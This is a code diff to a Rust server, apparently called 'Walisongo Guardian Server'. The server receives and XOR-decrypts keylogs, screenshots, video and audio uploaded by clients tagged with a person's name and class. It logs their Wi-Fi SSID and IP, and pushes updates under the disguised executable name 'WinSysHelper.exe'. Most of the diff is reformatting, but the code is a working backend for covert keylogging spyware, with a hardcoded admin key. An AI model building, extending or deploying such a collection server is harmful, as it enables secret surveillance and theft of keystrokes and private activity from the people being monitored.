@@ -1,22 +1,24 @@
 use axum::{
+    Json, Router,
     extract::{DefaultBodyLimit, Path, State},
     http::{HeaderMap, StatusCode},
     response::IntoResponse,
     routing::{get, post},
-    Json, Router,
 };
+use chrono::{DateTime, Local};
 use serde::{Deserialize, Serialize};
 use serde_json::json;
-use std::path::{PathBuf};
+use sha2::{Digest, Sha256};
+use std::collections::HashMap;
+use std::path::PathBuf;
 use std::sync::Arc;
 use tokio::fs::{self, OpenOptions};
-use tokio::io::AsyncWriteExt;
+use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::sync::RwLock;
-use tracing::{info, warn, error, Level};
+use tracing::{Level, error, info, warn};
 use tracing_subscriber::FmtSubscriber;
-use chrono::{DateTime, Local};
-use std::collections::HashMap;
-use sha2::{Sha256, Digest};
+mod web_dashboard;
+use web_dashboard::run_dashboard;
 
 // ============================================================================
 // DOMAIN MODELS & STRUCTURES
@@ -106,13 +108,22 @@ impl FileIndex {
         self.files_by_id.insert(file_id.clone(), metadata);
 
         // Add to files_by_user
-        self.files_by_user.entry(user_key).or_insert_with(Vec::new).push(file_id.clone());
+        self.files_by_user
+            .entry(user_key)
+            .or_insert_with(Vec::new)
+            .push(file_id.clone());
 
         // Add to files_by_type
-        self.files_by_type.entry(type_key).or_insert_with(Vec::new).push(file_id.clone());
+        self.files_by_type
+            .entry(type_key)
+            .or_insert_with(Vec::new)
+            .push(file_id.clone());
 
         // Add to files_by_date
-        self.files_by_date.entry(date_key).or_insert_with(Vec::new).push(file_id);
+        self.files_by_date
+            .entry(date_key)
+            .or_insert_with(Vec::new)
+            .push(file_id);
     }
 
     fn query_by_user(&self, class: &str, name: &str) -> Vec<FileMetadata> {
@@ -171,13 +182,19 @@ fn validate_auth(headers: &HeaderMap, key: &str) -> bool {
 
 /// Extract header value sebagai Option untuk fleksibilitas unwrap
 fn get_header(headers: &HeaderMap, key: &str) -> Option<String> {
-    headers.get(key).and_then(|v| v.to_str().ok()).map(|s| s.to_string())
+    headers
+        .get(key)
+        .and_then(|v| v.to_str().ok())
+        .map(|s| s.to_string())
 }
 
 /// Parse user info dari format "Name[Class]"
 fn parse_user_info(x_user: &str) -> (String, String) {
     if let (Some(s), Some(e)) = (x_user.find('['), x_user.find(']')) {
-        (x_user[..s].trim().to_string(), x_user[s+1..e].trim().to_string())
+        (
+            x_user[..s].trim().to_string(),
+            x_user[s + 1..e].trim().to_string(),
+        )
     } else {
         ("Unknown".to_string(), "Unknown".to_string())
     }
@@ -239,7 +256,7 @@ async fn main() {
         .with_thread_ids(true)
         .with_line_number(true)
         .finish();
-    
+
     tracing::subscriber::set_global_default(subscriber)
         .expect("Failed to initialize system logger");
 
@@ -251,6 +268,11 @@ async fn main() {
         auth_key: "ADMIN-2025".to_string(),
         exe_name: "WinSysHelper.exe".to_string(),
         index: RwLock::new(FileIndex::new()),
+    });
+
+    let dashboard_root = config.upload_root.clone();
+    tokio::spawn(async {
+        run_dashboard(dashboard_root, 8081).await;
     });
 
     // === INISIALISASI DIREKTORI ===
@@ -271,8 +293,10 @@ async fn main() {
         if let Ok(index_data) = fs::read_to_string(&index_path).await {
             if let Ok(loaded_index) = serde_json::from_str::<FileIndex>(&index_data) {
                 *config.index.write().await = loaded_index;
-                info!("Loaded file index from disk with {} entries", 
-                    config.index.read().await.files_by_id.len());
+                info!(
+                    "Loaded file index from disk with {} entries",
+                    config.index.read().await.files_by_id.len()
+                );
             }
         }
     }
@@ -282,27 +306,29 @@ async fn main() {
         // Upload endpoints
         .route("/upload", post(handle_upload))
         .route("/post-active", post(handle_active_status))
-        
         // Update endpoints
         .route("/check-update", get(handle_check_update))
         .route("/get-update", get(handle_get_update))
-        
         // Query endpoints (untuk monitoring/analytics)
         .route("/api/files/:user/:class", get(handle_query_files_by_user))
-        .route("/api/files/type/:file_type", get(handle_query_files_by_type))
+        .route(
+            "/api/files/type/:file_type",
+            get(handle_query_files_by_type),
+        )
         .route("/api/files/date/:date", get(handle_query_files_by_date))
-        .route("/api/files/:file_id/metadata", get(handle_get_file_metadata))
+        .route(
+            "/api/files/:file_id/metadata",
+            get(handle_get_file_metadata),
+        )
         .route("/api/stats", get(handle_get_stats))
-        
         // Health check
         .route("/health", get(handle_health_check))
-        
         .layer(DefaultBodyLimit::max(1024 * 1024 * 50))
         .with_state(config.clone());
 
     let addr = "0.0.0.0:8080";
     let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
-    
+
     info!("Walisongo Guardian Server v3.1 initialized successfully");
     info!("✓ Listening on {}", addr);
     info!("✓ Upload root: {:?}", config.upload_root);
@@ -332,8 +358,14 @@ async fn handle_upload(
     let x_type = get_header(&headers, "X-Type").unwrap_or_default();
     let file_id = get_header(&headers, "X-File-ID").unwrap_or_default();
     let filename = get_header(&headers, "X-Filename").unwrap_or_default();
-    let chunk_num: i32 = get_header(&headers, "X-Chunk-Num").unwrap_or_default().parse().unwrap_or(0);
-    let chunk_total: i32 = get_header(&headers, "X-Chunk-Total").unwrap_or_default().parse().unwrap_or(1);
+    let chunk_num: i32 = get_header(&headers, "X-Chunk-Num")
+        .unwrap_or_default()
+        .parse()
+        .unwrap_or(0);
+    let chunk_total: i32 = get_header(&headers, "X-Chunk-Total")
+        .unwrap_or_default()
+        .parse()
+        .unwrap_or(1);
     let client_timestamp = get_header(&headers, "X-Timestamp").unwrap_or_default();
     let client_version = get_header(&headers, "X-Version").unwrap_or_else(|| "none".to_string());
 
@@ -488,7 +520,8 @@ async fn handle_active_status(
                 "Heartbeat received"
             );
 
-            let log_dir = config.upload_root
+            let log_dir = config
+                .upload_root
                 .join(sanitize_path(&user_class))
                 .join(sanitize_path(&user_name));
 
@@ -505,8 +538,8 @@ async fn handle_active_status(
                 .open(&log_path)
                 .await
             {
-                let log_entry = serde_json::to_string(&active_status)
-                    .unwrap_or_else(|_| "{}".to_string());
+                let log_entry =
+                    serde_json::to_string(&active_status).unwrap_or_else(|_| "{}".to_string());
                 let _ = f.write_all(format!("{}\n", log_entry).as_bytes()).await;
             }
 
@@ -523,7 +556,10 @@ async fn handle_active_status(
                     timestamp,
                     version,
                     ssid,
-                    active_status.client_ip.as_ref().unwrap_or(&"N/A".to_string())
+                    active_status
+                        .client_ip
+                        .as_ref()
+                        .unwrap_or(&"N/A".to_string())
                 );
                 let _ = f.write_all(log_line.as_bytes()).await;
             }
@@ -556,7 +592,7 @@ async fn handle_check_update(
     }
 
     let exe_path = config.update_root.join(&config.exe_name);
-    
+
     let (hash, version) = match fs::read(&exe_path).await {
         Ok(data) => {
             let hash = calculate_hash(&data);
@@ -596,7 +632,7 @@ async fn handle_get_update(
     }
 
     let update_path = config.update_root.join(&config.exe_name);
-    
+
     match fs::read(&update_path).await {
         Ok(data) => {
             info!(
@@ -623,7 +659,10 @@ async fn handle_query_files_by_user(
     headers: HeaderMap,
 ) -> impl IntoResponse {
     if !validate_auth(&headers, &config.auth_key) {
-        return (StatusCode::UNAUTHORIZED, Json(json!({"error": "Unauthorized"})));
+        return (
+            StatusCode::UNAUTHORIZED,
+            Json(json!({"error": "Unauthorized"})),
+        );
     }
 
     let index = config.index.read().await;
@@ -646,7 +685,10 @@ async fn handle_query_files_by_type(
     headers: HeaderMap,
 ) -> impl IntoResponse {
     if !validate_auth(&headers, &config.auth_key) {
-        return (StatusCode::UNAUTHORIZED, Json(json!({"error": "Unauthorized"})));
+        return (
+            StatusCode::UNAUTHORIZED,
+            Json(json!({"error": "Unauthorized"})),
+        );
     }
 
     let index = config.index.read().await;
@@ -668,7 +710,10 @@ async fn handle_query_files_by_date(
     headers: HeaderMap,
 ) -> impl IntoResponse {
     if !validate_auth(&headers, &config.auth_key) {
-        return (StatusCode::UNAUTHORIZED, Json(json!({"error": "Unauthorized"})));
+        return (
+            StatusCode::UNAUTHORIZED,
+            Json(json!({"error": "Unauthorized"})),
+        );
     }
 
     let index = config.index.read().await;
@@ -690,14 +735,20 @@ async fn handle_get_file_metadata(
     headers: HeaderMap,
 ) -> impl IntoResponse {
     if !validate_auth(&headers, &config.auth_key) {
-        return (StatusCode::UNAUTHORIZED, Json(json!({"error": "Unauthorized"})));
+        return (
+            StatusCode::UNAUTHORIZED,
+            Json(json!({"error": "Unauthorized"})),
+        );
     }
 
     let index = config.index.read().await;
-    
+
     match index.files_by_id.get(&file_id) {
         Some(metadata) => (StatusCode::OK, Json(json!(metadata))),
-        None => (StatusCode::NOT_FOUND, Json(json!({"error": "File not found"}))),
+        None => (
+            StatusCode::NOT_FOUND,
+            Json(json!({"error": "File not found"})),
+        ),
     }
 }
 
@@ -706,7 +757,10 @@ async fn handle_get_stats(
     headers: HeaderMap,
 ) -> impl IntoResponse {
     if !validate_auth(&headers, &config.auth_key) {
-        return (StatusCode::UNAUTHORIZED, Json(json!({"error": "Unauthorized"})));
+        return (
+            StatusCode::UNAUTHORIZED,
+            Json(json!({"error": "Unauthorized"})),
+        );
     }
 
     let index = config.index.read().await;
@@ -763,73 +817,118 @@ async fn finalize_file_task(
     client_version: String,
     client_timestamp: String,
 ) {
-    if let Ok(file_data) = fs::read(&path).await {
-        let file_size = file_data.len() as u64;
-        let file_hash = calculate_hash(&file_data);
+    let file_size = match fs::metadata(&path).await {
+        Ok(metadata) => metadata.len(),
+        Err(e) => {
+            error!(path = ?path, user = %user_name, error = %e, "Failed to stat file for finalization");
+            return;
+        }
+    };
 
-        let mut decrypted_data = file_data.clone();
-        decrypt_logic(&mut decrypted_data, &static_key);
+    let extension = match x_type.as_str() {
+        "screenshot" => "jpg",
+        "keylog" => "txt",
+        "activity" => "txt",
+        "video" => "mp4",
+        "audio" => "wav",
+        _ => "bin",
+    };
 
-        let extension = match x_type.as_str() {
-            "screenshot" => "jpg",
-            "keylog" => "txt",
-            "activity" => "txt",
-            "video" => "mp4",
-            "audio" => "wav",
-            _ => "bin",
+    let final_path = path.with_extension(extension);
+    let mut input = match fs::File::open(&path).await {
+        Ok(file) => file,
+        Err(e) => {
+            error!(path = ?path, user = %user_name, error = %e, "Failed to open file for finalization");
+            return;
+        }
+    };
+    let mut output = match fs::File::create(&final_path).await {
+        Ok(file) => file,
+        Err(e) => {
+            error!(path = ?final_path, user = %user_name, error = %e, "Failed to create finalized file");
+            return;
+        }
+    };
+
+    let key = static_key.as_bytes();
+    let mut hasher = Sha256::new();
+    let mut buffer = vec![0_u8; 64 * 1024];
+    let mut offset = 0usize;
+
+    loop {
+        let read = match input.read(&mut buffer).await {
+            Ok(0) => break,
+            Ok(read) => read,
+            Err(e) => {
+                error!(path = ?path, user = %user_name, error = %e, "Failed to read file during finalization");
+                let _ = fs::remove_file(&final_path).await;
+                return;
+            }
         };
 
-        let final_path = path.with_extension(extension);
-        if let Err(e) = fs::write(&final_path, &decrypted_data).await {
+        hasher.update(&buffer[..read]);
+        for i in 0..read {
+            buffer[i] ^= key[(offset + i) % key.len()];
+        }
+
+        if let Err(e) = output.write_all(&buffer[..read]).await {
             error!(path = ?final_path, user = %user_name, error = %e, "Failed to write finalized file");
+            let _ = fs::remove_file(&final_path).await;
             return;
         }
 
-        let _ = fs::remove_file(&path).await;
-
-        let file_id = generate_file_id();
-        let metadata = FileMetadata {
-            file_id: file_id.clone(),
-            original_filename: filename.clone(),
-            data_type: x_type.clone(),
-            user_name: user_name.clone(),
-            user_class: user_class.clone(),
-            client_version,
-            received_at: Local::now(),
-            client_timestamp,
-            file_size,
-            file_hash,
-            status: "complete".to_string(),
-            stored_path: final_path.to_string_lossy().to_string(),
-            client_ip: None,
-            extra_metadata: HashMap::new(),
-        };
-
-        let metadata_path = final_path.with_extension("json");
-        if let Ok(metadata_json) = serde_json::to_string_pretty(&metadata) {
-            let _ = fs::write(&metadata_path, metadata_json).await;
-        }
-
-        {
-            let mut index = config.index.write().await;
-            index.add_file(metadata.clone()).await;
-        }
-
-        let index = config.index.read().await;
-        let index_path = config.upload_root.join("_index.json");
-        if let Ok(index_json) = serde_json::to_string_pretty(&*index) {
-            let _ = fs::write(&index_path, index_json).await;
-        }
-
-        info!(
-            user = %user_name,
-            file = %filename,
-            type = %x_type,
-            size = file_size,
-            final_path = ?final_path,
-            "File finalized successfully"
-        );
-    } else {
-        error!(path = ?path, user = %user_name, "Failed to read file for finalization");
+        offset += read;
     }
+
+    if let Err(e) = output.flush().await {
+        error!(path = ?final_path, user = %user_name, error = %e, "Failed to flush finalized file");
+        let _ = fs::remove_file(&final_path).await;
+        return;
+    }
+
+    let file_hash = format!("{:x}", hasher.finalize());
+    let _ = fs::remove_file(&path).await;
+
+    let file_id = generate_file_id();
+    let metadata = FileMetadata {
+        file_id: file_id.clone(),
+        original_filename: filename.clone(),
+        data_type: x_type.clone(),
+        user_name: user_name.clone(),
+        user_class: user_class.clone(),
+        client_version,
+        received_at: Local::now(),
+        client_timestamp,
+        file_size,
+        file_hash,
+        status: "complete".to_string(),
+        stored_path: final_path.to_string_lossy().to_string(),
+        client_ip: None,
+        extra_metadata: HashMap::new(),
+    };
+
+    let metadata_path = final_path.with_extension("json");
+    if let Ok(metadata_json) = serde_json::to_string_pretty(&metadata) {
+        let _ = fs::write(&metadata_path, metadata_json).await;
+    }
+
+    {
+        let mut index = config.index.write().await;
+        index.add_file(metadata.clone()).await;
+    }
+
+    let index = config.index.read().await;
+    let index_path = config.upload_root.join("_index.json");
+    if let Ok(index_json) = serde_json::to_string_pretty(&*index) {
+        let _ = fs::write(&index_path, index_json).await;
+    }
+
+    info!(
+        user = %user_name,
+        file = %filename,
+        type = %x_type,
+        size = file_size,
+        final_path = ?final_path,
+        "File finalized successfully"
+    );
 }
